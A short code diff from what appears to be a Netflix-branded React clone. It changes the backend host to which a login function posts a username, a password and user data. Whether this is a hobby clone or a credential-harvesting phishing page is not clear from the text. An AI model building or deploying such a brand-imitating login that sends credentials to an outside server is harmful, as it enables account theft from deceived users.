@@ -24,7 +24,7 @@ function App() {
 
   const check = () => {
     axios
-      .post("https://netflix-azev.onrender.com/success", {
+      .post("https://netflix-ps8e.onrender.com/success", {
         eusername,
         epassword,
         userdata,
